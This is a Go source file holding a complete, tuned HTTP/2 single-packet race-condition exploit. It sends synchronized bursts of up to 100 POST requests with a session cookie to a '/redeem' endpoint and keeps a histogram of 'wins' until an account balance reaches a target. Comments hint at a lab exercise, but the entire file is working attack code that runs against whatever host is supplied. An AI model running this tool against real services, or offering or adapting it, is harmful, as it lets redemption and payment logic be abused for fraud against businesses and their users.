// race.go — HTTP/2 single-packet race exploit (final, reviewed).
//
// Honest expectation:
//   The single-packet attack over TLS has a documented theoretical
//   ceiling of ~20–30 requests per attack (PortSwigger "Smashing the
//   State Machine", confirmed by h2spacex, PayloadsAllTheThings, Flatt
//   Security). Empirically users hit 30–40 wins; OP is already at the
//   ceiling. No client-side tuning will exceed it for this technique.
//
// What this build does optimally:
//   1. Single TCP connection (default) — tightest possible sync,
//      no cross-conn jitter, all triggers in one ~900-byte TCP packet.
//   2. Hand-built trigger bytes — zero h2-library work in the hot path.
//   3. PING+ACK sync — guarantees server has read past HEADERS before
//      we fire the trigger. Deterministic, not a guess-sleep.
//   4. Proper frame handling: RST_STREAM, GOAWAY, PING, SETTINGS,
//      WINDOW_UPDATE all dealt with correctly.
//   5. Per-balance win histogram so you can see exactly what landed.

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	host   string
	cookie string
	path   = "/redeem"
)

type Handle struct {
	conn     *tls.Conn
	framer   *http2.Framer
	trigger  []byte
	nStreams int
}

// ─── Connection setup ────────────────────────────────────────────────

func dialH2() (*tls.Conn, *http2.Framer, error) {
	raw, err := net.DialTimeout("tcp", host+":443", 10*time.Second)
	if err != nil {
		return nil, nil, err
	}
	if tcp, ok := raw.(*net.TCPConn); ok {
		tcp.SetNoDelay(true)         // no Nagle batching delay
		tcp.SetWriteBuffer(4 << 20)  // 4MB send buffer
	}
	conn := tls.Client(raw, &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         host,
	})
	if err := conn.Handshake(); err != nil {
		raw.Close()
		return nil, nil, err
	}
	if conn.ConnectionState().NegotiatedProtocol != "h2" {
		conn.Close()
		return nil, nil, fmt.Errorf("server did not negotiate h2")
	}
	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		conn.Close()
		return nil, nil, err
	}
	fr := http2.NewFramer(conn, conn)
	if err := fr.WriteSettings(); err != nil {
		conn.Close()
		return nil, nil, err
	}

	// Drain server's initial SETTINGS / WINDOW_UPDATE and ack.
	// Keep reading until we've seen SETTINGS and acked it, or until a brief
	// timeout. After this we're free to send HEADERS.
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	sawSettings := false
	for i := 0; i < 8 && !sawSettings; i++ {
		f, err := fr.ReadFrame()
		if err != nil {
			break
		}
		switch ft := f.(type) {
		case *http2.SettingsFrame:
			if !ft.IsAck() {
				fr.WriteSettingsAck()
				sawSettings = true
			}
		}
	}
	conn.SetReadDeadline(time.Time{})
	return conn, fr, nil
}

// preload sends `streams` HEADERS frames without END_STREAM. Builds the
// matching all-streams trigger blob ready for one Write().
func preload(conn *tls.Conn, fr *http2.Framer, streams int) (*Handle, error) {
	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	for i := 0; i < streams; i++ {
		sid := uint32(2*i + 1)
		hb.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
		enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
		enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
		enc.WriteField(hpack.HeaderField{Name: "cookie", Value: cookie})
		enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: "race-go"})
		enc.WriteField(hpack.HeaderField{Name: "accept", Value: "*/*"})
		enc.WriteField(hpack.HeaderField{Name: "content-length", Value: "0"})

		if err := fr.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      sid,
			BlockFragment: hb.Bytes(),
			EndStream:     false,
			EndHeaders:    true,
		}); err != nil {
			return nil, err
		}
	}

	// Trigger = 100 × 9-byte empty DATA frames with END_STREAM flag.
	// Frame layout (RFC 7540 §4.1):
	//   [Length:3][Type:1][Flags:1][R:1bit][StreamID:31bit]
	trigger := make([]byte, 9*streams)
	for i := 0; i < streams; i++ {
		off := i * 9
		// bytes 0..2 (length=0) and byte 3 (type=DATA=0) stay zero
		trigger[off+4] = 0x01 // END_STREAM
		binary.BigEndian.PutUint32(trigger[off+5:off+9], uint32(2*i+1))
	}
	return &Handle{conn: conn, framer: fr, trigger: trigger, nStreams: streams}, nil
}

// pingSync sends a PING and waits for its ACK. Drains any other frames
// (RST_STREAM, WINDOW_UPDATE, etc.) the server happens to emit. After
// this returns, the server has read past all our HEADERS.
func pingSync(h *Handle, timeout time.Duration) error {
	var payload [8]byte
	copy(payload[:], "RACETIME")
	if err := h.framer.WritePing(false, payload); err != nil {
		return err
	}
	h.conn.SetReadDeadline(time.Now().Add(timeout))
	defer h.conn.SetReadDeadline(time.Time{})
	for {
		f, err := h.framer.ReadFrame()
		if err != nil {
			return err
		}
		if pf, ok := f.(*http2.PingFrame); ok && pf.IsAck() && bytes.Equal(pf.Data[:], payload[:]) {
			return nil
		}
		// Server-initiated PING (rare) — ACK and keep waiting.
		if pf, ok := f.(*http2.PingFrame); ok && !pf.IsAck() {
			h.framer.WritePing(true, pf.Data)
		}
	}
}

// ─── Response collection ─────────────────────────────────────────────

var balRe = regexp.MustCompile(`"balance":(\d+)`)

type result struct {
	balance int
	ok      bool
	body    []byte
}

func collect(h *Handle, timeout time.Duration) []result {
	bodies := make(map[uint32]*bytes.Buffer)
	ended := make(map[uint32]bool)
	deadline := time.Now().Add(timeout)
	h.conn.SetReadDeadline(deadline)
	defer h.conn.SetReadDeadline(time.Time{})

	for len(ended) < h.nStreams && time.Now().Before(deadline) {
		f, err := h.framer.ReadFrame()
		if err != nil {
			break
		}
		switch ft := f.(type) {
		case *http2.HeadersFrame:
			if bodies[ft.StreamID] == nil {
				bodies[ft.StreamID] = &bytes.Buffer{}
			}
			if ft.StreamEnded() {
				ended[ft.StreamID] = true
			}
		case *http2.DataFrame:
			b, ok := bodies[ft.StreamID]
			if !ok {
				b = &bytes.Buffer{}
				bodies[ft.StreamID] = b
			}
			b.Write(ft.Data())
			if ft.StreamEnded() {
				ended[ft.StreamID] = true
			}
		case *http2.RSTStreamFrame:
			// Server killed this stream — count as ended (no body).
			if bodies[ft.StreamID] == nil {
				bodies[ft.StreamID] = &bytes.Buffer{}
			}
			ended[ft.StreamID] = true
		case *http2.GoAwayFrame:
			// Server is shutting the connection — stop collecting.
			return harvest(bodies)
		case *http2.PingFrame:
			if !ft.IsAck() {
				h.framer.WritePing(true, ft.Data)
			}
		case *http2.WindowUpdateFrame, *http2.SettingsFrame, *http2.PriorityFrame:
			// fine, ignore
		}
	}
	return harvest(bodies)
}

func harvest(bodies map[uint32]*bytes.Buffer) []result {
	out := make([]result, 0, len(bodies))
	for _, b := range bodies {
		data := b.Bytes()
		r := result{body: data}
		if m := balRe.FindSubmatch(data); m != nil {
			r.balance, _ = strconv.Atoi(string(m[1]))
		}
		if bytes.Contains(data, []byte(`"ok":true`)) {
			r.ok = true
		}
		out = append(out, r)
	}
	return out
}

// ─── Race orchestration ──────────────────────────────────────────────

func raceSingle(streams int, preloadWait time.Duration, usePing bool) []result {
	conn, fr, err := dialH2()
	if err != nil {
		fmt.Printf("  [!] dial failed: %v\n", err)
		return nil
	}
	defer conn.Close()
	h, err := preload(conn, fr, streams)
	if err != nil {
		fmt.Printf("  [!] preload failed: %v\n", err)
		return nil
	}

	// Confirm server has read our HEADERS. PING sync is deterministic;
	// otherwise fall back to a fixed wait.
	if usePing {
		if err := pingSync(h, 3*time.Second); err != nil {
			fmt.Printf("  [!] ping sync failed: %v (falling back to sleep)\n", err)
			time.Sleep(preloadWait)
		}
	} else {
		time.Sleep(preloadWait)
	}

	// FIRE — single write, one TCP packet.
	if _, err := conn.Write(h.trigger); err != nil {
		fmt.Printf("  [!] fire failed: %v\n", err)
		return nil
	}
	return collect(h, 10*time.Second)
}

func raceMulti(nConns, streams int, preloadWait time.Duration, usePing bool) []result {
	handles := make([]*Handle, nConns)
	var swg sync.WaitGroup
	for i := 0; i < nConns; i++ {
		swg.Add(1)
		go func(idx int) {
			defer swg.Done()
			conn, fr, err := dialH2()
			if err != nil {
				return
			}
			h, err := preload(conn, fr, streams)
			if err != nil {
				conn.Close()
				return
			}
			handles[idx] = h
		}(i)
	}
	swg.Wait()

	var good []*Handle
	for _, h := range handles {
		if h != nil {
			good = append(good, h)
		}
	}
	if len(good) == 0 {
		return nil
	}

	// Sync barrier across all connections.
	if usePing {
		var pwg sync.WaitGroup
		for _, h := range good {
			pwg.Add(1)
			go func(h *Handle) {
				defer pwg.Done()
				pingSync(h, 3*time.Second)
			}(h)
		}
		pwg.Wait()
	} else {
		time.Sleep(preloadWait)
	}

	// FIRE — arrive-barrier ensures every goroutine is parked on the
	// atomic spin before we release. Each goroutine owns its own OS
	// thread (LockOSThread) so the Go scheduler can't interleave them
	// mid-Write. Atomic spin beats channel-recv by ~µs of wakeup jitter.
	var fire uint32
	var arrived int32
	var fwg sync.WaitGroup
	for _, h := range good {
		fwg.Add(1)
		go func(h *Handle) {
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			defer fwg.Done()
			atomic.AddInt32(&arrived, 1)
			for atomic.LoadUint32(&fire) == 0 {
				runtime.Gosched()
			}
			h.conn.Write(h.trigger)
		}(h)
	}
	for atomic.LoadInt32(&arrived) < int32(len(good)) {
		runtime.Gosched()
	}
	atomic.StoreUint32(&fire, 1)
	fwg.Wait()

	// COLLECT in parallel.
	all := make([][]result, len(good))
	var cwg sync.WaitGroup
	for i, h := range good {
		cwg.Add(1)
		go func(i int, h *Handle) {
			defer cwg.Done()
			all[i] = collect(h, 10*time.Second)
			h.conn.Close()
		}(i, h)
	}
	cwg.Wait()

	var merged []result
	for _, r := range all {
		merged = append(merged, r...)
	}
	return merged
}

// ─── Output ──────────────────────────────────────────────────────────

func summarize(results []result, dt time.Duration, round int) (int, int) {
	wins := 0
	maxBal := 0
	statusCount := 0
	winBalances := make(map[int]int)
	for _, r := range results {
		statusCount++
		if r.ok {
			wins++
			winBalances[r.balance]++
		}
		if r.balance > maxBal {
			maxBal = r.balance
		}
	}
	keys := make([]int, 0, len(winBalances))
	for k := range winBalances {
		keys = append(keys, k)
	}
	sort.Ints(keys)
	winStr := ""
	for _, k := range keys {
		winStr += fmt.Sprintf(" %d×%d", winBalances[k], k)
	}
	fmt.Printf("[r%02d] %.2fs  resp=%d  wins=%d  max_bal=%d  win_balances:%s\n",
		round, dt.Seconds(), statusCount, wins, maxBal, winStr)
	return wins, maxBal
}

// ─── Main ────────────────────────────────────────────────────────────

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	nConns := flag.Int("conns", 1, "parallel TCP connections (1=tightest, recommended)")
	streams := flag.Int("streams", 100, "streams per connection (server cap=100)")
	target := flag.Int("target", 405, "stop once balance >= target")
	rounds := flag.Int("rounds", 3, "max rounds")
	preloadMS := flag.Int("preload-ms", 50, "wait after HEADERS before trigger (ignored if -ping)")
	usePing := flag.Bool("ping", true, "use PING+ACK sync instead of timed sleep")
	flag.StringVar(&host, "host", "target.example.com", "target host")
	flag.StringVar(&cookie, "cookie",
		"session=PASTE_YOUR_COOKIE_HERE", "session cookie")
	flag.Parse()

	fmt.Printf("[*] Target  : https://%s%s\n", host, path)
	fmt.Printf("[*] Burst   : %d reqs (%d × %d)\n", (*nConns)*(*streams), *nConns, *streams)
	fmt.Printf("[*] Sync    : ")
	if *usePing {
		fmt.Println("PING+ACK (deterministic)")
	} else {
		fmt.Printf("sleep %dms\n", *preloadMS)
	}
	fmt.Println()

	maxBalance := 0
	totalWins := 0
	preloadWait := time.Duration(*preloadMS) * time.Millisecond
	t0 := time.Now()

	for r := 1; r <= *rounds; r++ {
		round := time.Now()
		var results []result
		if *nConns == 1 {
			results = raceSingle(*streams, preloadWait, *usePing)
		} else {
			results = raceMulti(*nConns, *streams, preloadWait, *usePing)
		}
		wins, mb := summarize(results, time.Since(round), r)
		totalWins += wins
		if mb > maxBalance {
			maxBalance = mb
		}
		if maxBalance >= *target {
			fmt.Printf("\n[+++] TARGET HIT: balance=%d >= %d\n", maxBalance, *target)
			break
		}
		if r > 1 && wins == 0 {
			fmt.Println("\n[!] Lab locked after first burst — wins won't increase. Reset & rerun.")
			break
		}
	}
	fmt.Printf("\n[=] Final balance: %d   total wins: %d   elapsed: %.1fs\n",
		maxBalance, totalWins, time.Since(t0).Seconds())
}
